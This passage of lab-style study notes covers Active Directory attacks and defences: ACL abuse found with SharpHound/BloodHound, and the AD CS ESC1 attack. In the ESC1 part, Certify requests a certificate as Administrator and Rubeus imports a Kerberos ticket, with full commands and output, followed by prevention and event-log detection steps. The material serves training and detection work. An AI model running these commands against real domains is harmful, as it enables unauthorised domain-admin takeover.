+2022-12-19T14:16:39.1749601+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
+2022-12-19T14:16:39.3312221+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-12-19T14:16:39.3468314+01:00|INFORMATION|Initializing SharpHound at 14.16 on 19/12/2022
+2022-12-19T14:16:39.5187113+01:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-12-19T14:16:39.7530826+01:00|INFORMATION|Beginning LDAP search for eagle.local
+2022-12-19T14:16:39.7999574+01:00|INFORMATION|Producer has finished, closing LDAP channel
+2022-12-19T14:16:39.7999574+01:00|INFORMATION|LDAP channel closed, waiting for consumers
+2022-12-19T14:17:09.8937530+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
+2022-12-19T14:17:28.4874698+01:00|INFORMATION|Consumers finished, closing output channel
+2022-12-19T14:17:28.5343302+01:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2022-12-19T14:17:28.6124768+01:00|INFORMATION|Status: 114 objects finished (+114 2.375)/s -- Using 46 MB RAM
+2022-12-19T14:17:28.6124768+01:00|INFORMATION|Enumeration finished in 00:00:48.8638030
+2022-12-19T14:17:28.6905842+01:00|INFORMATION|Saving cache with stats: 74 ID to type mappings.
+ 76 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2022-12-19T14:17:28.6905842+01:00|INFORMATION|SharpHound Enumeration Completed at 14.17 on 19/12/2022! Happy Graphing!
+```
+
+The ZIP file generated by SharpHound can then be visualized in BloodHound. Instead of looking for every misconfigured ACL in the environment, we will focus on potential escalation paths that originate from the user Bob (our initial user, which we had already compromised and have complete control over). Therefore, the following image demonstrates the different access that Bob has to the environment:
+
+[bloodhound example](./bloodhound_example.webp)
+
+Bob has full rights over the user Anni and the computer Server01. Below is what Bob can do with each of these:
+
+- Case 1: Full rights over the user Anni. In this case, Bob can modify the object Anni by specifying some bonus SPN value and then perform the Kerberoast attack against it (if you recall, the success of this attack depends on the password's strength). However, Bob can also modify the password of the user Anni and then log in as that account, therefore, directly inheriting and being able to perform everything that Anni can (if Anni is a Domain admin, then Bob would have the same rights).
+- Case 2: Full control over a computer object can also be fruitful. If `LAPS` is used in the environment, then Bob can obtain the password stored in the attributes and authenticate as the local Administrator account to this server. Another escalation path is abusing `Resource-Based Kerberos Delegation`, allowing Bob to authenticate as anyone to this server. Recall that from the previous attack, Server01 is trusted for Unconstrained delegation, so if Bob was to get administrative rights on this server, he has a potential escalation path to compromise the identity of a Domain Controller or other sensitive computer object.
+
+We can also use [ADACLScanner](https://github.com/canix1/ADACLScanner) to create reports of `discretionary access control lists` (`DACLs`) and `system access control lists` (`SACLs`).
+
+## Prevention
+
+There are three things we can do:
+
+- Begin `continuous assessment` to detect if this is a problem in the AD environment.
+- `Educate` employees with high privileges to avoid doing this.
+- `Automate` as much as possible from the access management process, and only assign privileged access to administrative accounts; this ensures that administrators don't manually edit accounts which reduces the risk of introducing delegated rights to unprivileged users.
+
+## Detection
+
+Fortunately, we have several ways to detect if AD objects are modified. Unfortunately, the events generated for modified objects are incomplete, as they do not provide granular visibility over what was changed. For example, in the first case described above, Bob modified Anni by adding an SPN value. By doing so, Bob will have the means to perform Kerberoasting against Anni. When the SPN value gets added, an event with the ID `4738`, "A user account was changed", is generated. However, this event does not demonstrate all modified user properties, including the SPN. Therefore, the event only notifies about the modification of a user but does not specify what exactly was changed ( although it does have a fair amount of fields that can be useful). We'll be able to see in the logs that bob modified anni in our logs.
+
+However, using this event, we can tell if a non-privileged user performs privileged actions on another user. If, for example, all privileged users have a naming convention that begins with "adminxxxx", then any change not associated with "adminxxxx" is suspicious. If an ACL abuse leads to a password reset, the event ID `4724` will be logged.
+
+Similarly, if Bob were to perform the second scenario, an event with ID `4742` would be generated, which is also unfortunately limited in the information it can provide; however, it notifies about the action that the user account Bob is compromised and used maliciously. 
+
+## Honeypot
+
+Misconfigured ACLs can be an effective mechanism of detection for suspicious behavior. There are two ways to approach this:
+
+- Assign relatively high ACLs to a user account used as a honeypot via a previously discussed technique—for example, a user whose `fake` credentials are exposed in the description field. Having ACLs assigned to the account may provoke an adversary to attempt and verify if the account's exposed password is valid as it holds high potential.
+- Have an account that `everyone` or many users can modify. This user will ideally be a honeypot user, with some activity to mimic real users. Any changes occurring on this honeypot user are malicious since there is no valid reason for anyone to perform any actions on it (except admins, that may occasionally need to reset the account's password to make the account look realistic). Therefore, any event ID `4738` associated with the honeypot user should trigger an alert. Additionally, mature organizations may immediately disable the user performing the change and initiate a forensic investigation on the source device.
+
+# PKI - ESC1
+
+After `SpectreOps` released the research paper [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf), `Active Directory Certificate Services` (`AD CS`) became one of the most favorite attack vectors for threat agents due to many reasons, including:
+
+- Using certificates for authentication has more advantages than regular username/password credentials.
+- Most PKI servers were misconfigured/vulnerable to at least one of the eight attacks discovered by SpectreOps (various researchers have discovered more attacks since then).
+
+There are a plethora of advantages to using certificates and compromising the `Certificate Authority` (`CA`):
+
+- Users and machines certificates are valid for 1+ years.
+- Resetting a user password does not invalidate the certificate. With certificates, it doesn't matter how many times a user changes their password; the certificate will still be valid (unless expired or revoked).
+- Misconfigured templates allow for obtaining a certificate for any user.
+- Compromising the CA's private key results in forging `Golden Certificates`.
+
+These advantages make certificates the preferred method for long-term persistence. While SpectreOps disclosed eight privilege escalation techniques, we will examine the first, `ESC1`, to demonstrate how it works. The description of `ESC1` is:
+
+- `Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`.
+
+## The Attack
+
+To begin with, we will use [Certify](https://github.com/GhostPack/Certify) to scan the environment for vulnerabilities in the PKI infrastructure:
+```PowerShell
+PS C:\Users\bob\Downloads> .\Certify.exe find /vulnerable
+
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=eagle,DC=local'
+
+[*] Listing info about the Enterprise CA 'eagle-PKI-CA'
+
+    Enterprise CA Name            : eagle-PKI-CA
+    DNS Hostname                  : PKI.eagle.local
+    FullName                      : PKI.eagle.local\eagle-PKI-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=eagle-PKI-CA, DC=eagle, DC=local
+    Cert Thumbprint               : 7C59C4910A1C853128FE12C17C2A54D93D1EECAA
+    Cert Serial                   : 780E7B38C053CCAB469A33CFAAAB9ECE
+    Cert Start Date               : 09/08/2022 14.07.25
+    Cert End Date                 : 09/08/2522 14.17.25
+    Cert Chain                    : CN=eagle-PKI-CA,DC=eagle,DC=local
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
+      Allow  ManageCA, ManageCertificates               EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : PKI.eagle.local\eagle-PKI-CA
+    Template Name                         : UserCert ## name of the vulnerable template
+    Schema Version                        : 4
+    Validity Period                       : 10 years ## 
+    Renewal Period                        : 6 weeks
+    msPKI-Certificates-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT # "whoever requests the certificate, can specify whom is the certificate issued for"
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on ## Client auth -> "the certification can be used for authentification
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Smart Card Log-on
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
+    ##Who can request certs           EAGLE\Domain Users            S-1-5-21-1518138621-4282902758-752445584-513
+                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
+      Object Control Permissions
+        Owner                       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
+        WriteOwner Principals       : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
+                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
+                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
+        WriteDacl Principals        : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
+                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
+                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
+        WriteProperty Principals    : EAGLE\Administrator           S-1-5-21-1518138621-4282902758-752445584-500
+                                      EAGLE\Domain Admins           S-1-5-21-1518138621-4282902758-752445584-512
+                                      EAGLE\Enterprise Admins       S-1-5-21-1518138621-4282902758-752445584-519
+
+Certify completed in 00:00:00.9120044
+```
+
+When checking the 'Vulnerable Certificate Templates' section from the output of Certify, we will see that a single template with plenty of information about it is listed. We can tell that the name of the CA in the environment is `PKI.eagle.local\eagle-PKI-CA`, and the vulnerable template is named `UserCert`. The template is vulnerable because:
+
+    All Domain users can request a certificate on this template.
+    The flag https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1 is present, allowing the requester to specify the SAN (therefore, any user can request a certificate as any other user in the network, including privileged ones).
+    Manager approval is not required (the certificate gets issued immediately after the request without approval).
+    The certificate can be used for 'Client Authentication' (we can use it for login/authentication).
+
+To abuse this template, we will use `Certify` and pass the argument `request` by specifying the full name of the CA, the name of the vulnerable template, and the name of the user, for example, `Administrator`:
+```PowerShell
+PS C:\Users\bob\Downloads> .\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
+
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : EAGLE\bob ## <--
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UserCert
+[*] Subject                 : CN=bob, OU=EagleUsers, DC=eagle, DC=local
+[*] AltName                 : Administrator ## <--
+
+[*] Certificate Authority   : PKI.eagle.local\eagle-PKI-CA
+
+[*] CA Response             : The certificate had been issued. ### <--
+[*] Request ID              : 36
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIE...
+<SNIP>
+<SNIP>
+wgP7EwPpxHKOrlZr6H+5lS58u/9EuIgdSk1X3VWuZvWRdjL15ovn
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGLzCCBRegAwIBAgITFgAAACx6zV6bbfN1ZQAAAAAALDANBgkqhkiG9w0BAQsF
+<SNIP>
+<SNIP>
+eVAB
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+
+Certify completed in 00:00:15.8803493
+```
+
+Once the attack finishes, we will obtain a certificate successfully. The command generates a `PEM` certificate and displays it as base64. We need to convert the `PEM` certificate to the [`PFX`](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) format by running the command mentioned in the output of Certify (when asked for the password, press `Enter` without providing one), however, to be on the safe side, let's first execute the below command to avoid bad formatting of the `PEM` file.
+
+Now we can copy past it on to a linux distro:
+
+```bash
+sed -i 's/\s\s\+/\n/g' cert.pem
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+We can then copy past the code back into the windows machine with:
+```bash
+cat cert.pfx | base64 > cert_b64.txt
+```
+Copy and paste the result into a text file in the windows machine and run this to convert it back from base64 to binary:
+```PowerShell
+[System.Convert]::FromBase64String((Get-Content "b64.txt")) | Set-Content "cert.pfx" -Encoding Byte
+```
+
+Now that we have the certificate in a usable `PFX` format (which `Rubeus` supports), we can request a Kerberos TGT for the account `Administrator` and authenticate with the certificate:
+```PowerShell
+PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.1
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=bob, OU=EagleUsers, DC=eagle, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\Administrator' # <--
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGVjCCBlKgAwIBBaEDAgEWooIFaTCCBWVhggVhMIIFXaADAgEFoQ0bC0VBR0xFLkxPQ0FMoiAwHqA
+      <SNIP>
+      GA8yMDIyMTIyNjIwMDQ1M1qoDRsLRUFHTEUuTE9DQUypIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC2VhZ2xl
+      LmxvY2Fs
+[+] Ticket successfully imported! # <---
+
+<SNIP>
+```
+
+After successful authentication, we will be able to list the content of the `C$` share on DC1:
+```PowerShell
+PS C:\Users\bob\Downloads> dir \\dc1\c$
+
+    Directory: \\dc1\c$
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/15/2022   6:30 PM                DFSReports
+d-----        10/13/2022  11:23 PM                Mimikatz
+d-----          9/1/2022   9:49 PM                PerfLogs
+d-r---        11/28/2022  10:59 AM                Program Files
+d-----          9/1/2022   2:02 PM                Program Files (x86)
+d-----        12/13/2022  11:22 AM                scripts
+d-r---          8/7/2022   9:31 PM                Users
+d-----        11/28/2022  11:27 AM                Windows
+```
+
+## Prevention
+
+The attack would not be possible if the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is not enabled in the certificate template. Another method to thwart this attack is to require `CA certificate manager approval` before issuing certificates; this will ensure that no certificates on potentially dangerous templates are issued without manual approval (which hopefully correlates that the request originated from a legit user).
+
+Because there are many different privilege escalation techniques, it is highly advised to regularly scan the environment with `Certify` or other similar tools to find potential PKI issues.
+
+## Detection
+
+When the CA generates the certificate, two events will be logged, one for the received request and one for the issued certificate, if it succeeds. Those events have the IDs of `4886` and `4887`. They show the requester (`EAGLE\bob` from `WS001` in our lab) but no `SAN` detail.
+
+The CA contains a list of all issued certificates, so if we look there, we will see the request for certificate ID `36`, this will also show the demanded `Certificate Template` (`UserCert` in our lab).
+
+The general overview of the GUI tool does not display the SAN either, but we can tell that a certificate was issued via the vulnerable template. If we want to find the SAN information, we'll need to open the certificate itself either in the GUI Certificate -> Detail -> Subject Alternative Name. There is also the possibility to view that programmatically: the command `certutil -view` will dump everything on the CA with all of the information about each certificate (this can be massive in a large environment):
+[certutil -view](./certutil-view_command.webp)
+
+With some scripting, we can automate parsing and discovery of abused vulnerable templates by threat agents.
+
+Finally, if you recall, in the attack, we used the obtained certificate for authentication and obtained a TGT; AD will log this request with the event ID `4768`, which will specifically have information about the logon attempt with a certificate. With thie we can correlate the User/Client IP for suspicious behavior, in addition to informatino about the Certifier Information (eagle-PKI-CA in our lab).
+
+Note that events 4886 and 4887 will be generated on the machine issuing the certificate rather than the domain controller. If GUI access is not available, we can use PSSession to interact with the PKI machine, and the Get-WinEvent cmdlet to search for the events:
+```cmd
+C:\Users\bob\Downloads>runas /user:eagle\htb-student powershell
+
+Enter the password for eagle\htb-student:
+Attempting to start powershell as user "eagle\htb-student" ...
+```
+```PowerShell
+## New session opened by the commands above
+PS C:\WINDOWS\system32> New-PSSession PKI
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  4 WinRM4          PKI             RemoteMachine   Opened        Microsoft.PowerShell     Available
+
+PS C:\WINDOWS\system32> Enter-PSSession PKI
+
+[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4886'}
+
+
+   ProviderName: Microsoft-Windows-Security-Auditing
+
+TimeCreated                     Id LevelDisplayName Message
+-----------                     -- ---------------- -------
+4/13/2023 4:05:50 PM          4886 Information      Certificate Services received a certificate request....
+4/11/2023 1:24:02 PM          4886 Information      Certificate Services received a certificate request....
+4/11/2023 1:15:01 PM          4886 Information      Certificate Services received a certificate request....
+
+
+[PKI]: PS C:\Users\htb-student\Documents> Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}
+
+
+   ProviderName: Microsoft-Windows-Security-Auditing
+
+TimeCreated                     Id LevelDisplayName Message
+-----------                     -- ---------------- -------
+4/13/2023 4:06:05 PM          4887 Information      Certificate Services approved a certificate request and...
+4/13/2023 4:06:02 PM          4887 Information      Certificate Services approved a certificate request and...
+4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
+4/11/2023 1:24:14 PM          4887 Information      Certificate Services approved a certificate request and...
+4/11/2023 1:15:12 PM          4887 Information      Certificate Services approved a certificate request and..
+```
+
+To view the full audit log of the events, we can pipe the output into `Format-List` , or save the events in an array and check them individually:
+```PowerShell
+[pki]: PS C:\Users\htb-student\Documents> $events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
+[pki]: PS C:\Users\htb-student\Documents> $events[0] | Format-List -Property *
+
+
+Message              : Certificate Services received a certificate request.
+
+                       Request ID:      51
+                       Requester:       EAGLE\DC2$
+                       Attributes:
+                       CertificateTemplate:DomainController
+                       ccm:PKI.eagle.local
+Id                   : 4886
+Version              : 0
+Qualifiers           :
+Level                : 0
+Task                 : 12805
+Opcode               : 0
+Keywords             : -9214364837600034816
+RecordId             : 21100
+ProviderName         : Microsoft-Windows-Security-Auditing
+ProviderId           : 54849625-5478-4994-a5ba-3e3b0328c30d
+LogName              : Security
+ProcessId            : 660
+ThreadId             : 772
+MachineName          : PKI.eagle.local
+UserId               :
+TimeCreated          : 4/11/2023 1:24:02 PM
+ActivityId           : dcf643ef-6c67-0000-6e44-f6dc676cd901
+RelatedActivityId    :
+ContainerLog         : Security
+MatchedQueryIds      : {}
+Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
+LevelDisplayName     : Information
+OpcodeDisplayName    : Info
+TaskDisplayName      : Certification Services
+KeywordsDisplayNames : {Audit Success}
+Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty}
+```
+
+
+
